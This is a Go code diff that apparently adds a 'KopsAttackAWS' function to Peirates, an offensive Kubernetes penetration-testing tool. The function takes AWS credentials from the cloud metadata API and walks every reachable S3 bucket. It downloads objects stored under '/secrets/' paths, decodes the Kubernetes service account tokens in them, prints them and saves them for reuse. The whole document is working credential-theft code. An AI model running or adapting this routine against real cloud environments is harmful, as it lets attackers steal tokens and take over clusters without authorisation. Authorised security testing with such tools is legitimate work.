@@ -1,7 +1,9 @@
 package peirates
 
 import (
+	"bytes"
 	"crypto/tls"
+	"encoding/base64"
 	"encoding/json"
 	"errors"
 	"fmt"
@@ -12,9 +14,9 @@ import (
 	"strings"
 
 	"github.com/aws/aws-sdk-go/aws"
+	"github.com/aws/aws-sdk-go/service/s3"
 	"github.com/aws/aws-sdk-go/aws/credentials"
 	"github.com/aws/aws-sdk-go/aws/session"
-	"github.com/aws/aws-sdk-go/service/s3"
 	"github.com/aws/aws-sdk-go/service/sts"
 )
 
@@ -292,5 +294,121 @@ func ListAWSBuckets(IAMCredentials AWSCredentials) (bucketNamesList []string, er
 }
 
 func nonexitErrorf(msg string, args ...interface{}) {
+
+
+
 	fmt.Fprintf(os.Stderr, msg+"\n", args...)
+
+}
+
+
+
+
+func KopsAttackAWS() (serviceAccountsToReturn []ServiceAccount, err error ) {
+
+
+	var storeTokens string
+	placeTokensInStore := false
+
+	println("[1] Store all tokens found in Peirates data store")
+	println("[2] Retrieve all tokens - I will copy and paste")
+	fmt.Scanln(&storeTokens)
+	storeTokens = strings.TrimSpace(storeTokens)
+
+	if storeTokens == "1" {
+		placeTokensInStore = true
+	}
+
+	if placeTokensInStore {
+		println("Saving tokens to store")
+	}
+
+	// Hit the metadata API only if AWS creds aren't loaded already.
+	var credentialsToUse AWSCredentials
+	if len(assumedAWSrole.AccessKeyId) > 0 {
+		credentialsToUse = assumedAWSrole
+	} else if len(awsCredentials.AccessKeyId) > 0 {
+		credentialsToUse = awsCredentials
+	} else {
+		println("Pulling AWS credentials from the metadata API.")
+		result, err := PullIamCredentialsFromAWS()
+		if err != nil {
+			println("[-] Could not get AWS credentials from metadata API.")
+			return nil, err
+		}
+		println("[+] Got AWS credentials from metadata API.")
+		awsCredentials = result
+		credentialsToUse = awsCredentials
+	}
+
+	println("[+] Preparing to use this AWS account to list and search S3 buckets: " + awsCredentials.AccessKeyId)
+
+	result, err := ListAWSBuckets(credentialsToUse)
+	if err != nil {
+		println("Could not list buckets")
+		return nil, err
+	}
+	listOfBuckets := result
+
+	// Start a single S3 session
+	svc := StartS3Session(credentialsToUse)
+
+	// Look in every bucket for an oject that has a subdirectory called "secrets" in it.
+	for _, bucket := range listOfBuckets {
+		println("\n\n=============================================\n\n")
+		println("Listing items in bucket " + bucket)
+
+		// Get the list of items
+		resp, err := svc.ListObjectsV2(&s3.ListObjectsV2Input{Bucket: aws.String(bucket)})
+		if err != nil {
+			println("Unable to list items in bucket %q, %v", bucket, err)
+			return nil, err
+		}
+
+		for _, item := range resp.Contents {
+
+			if strings.Contains(*item.Key, "/secrets/") {
+				fmt.Println("Investigating bucket object for tokens:  " + *item.Key)
+
+				result, err := svc.GetObject(&s3.GetObjectInput{
+					Bucket: aws.String(bucket),
+					Key:    aws.String(*item.Key),
+				})
+
+				if err != nil {
+					continue
+				}
+
+				buf := new(bytes.Buffer)
+				buf.ReadFrom(result.Body)
+				jsonOutput := buf.String()
+				byteEncodedJsonOutput := []byte(jsonOutput)
+				// Unmarshall the json into Data : encodedtoken
+
+				var structuredVersion AWSS3BucketObject
+
+				json.Unmarshal(byteEncodedJsonOutput, &structuredVersion)
+				encodedToken := structuredVersion.Data
+				println("Encoded token: " + encodedToken)
+				token, err := base64.StdEncoding.DecodeString(encodedToken)
+				if err != nil {
+					println("[-] Could not decode token.")
+				} else {
+					tokenString := string(token)
+					println(tokenString)
+
+					if placeTokensInStore {
+						tokenName := "AWS-acquired: " + string(*item.Key)
+						println("[+] Storing token as:", tokenName)
+						serviceAccount := MakeNewServiceAccount(tokenName, tokenString, "AWS Bucket")
+						serviceAccountsToReturn = append(serviceAccountsToReturn, serviceAccount)
+					}
+				}
+
+			}
+
+		}
+	}
+	return serviceAccountsToReturn, nil
+
 }
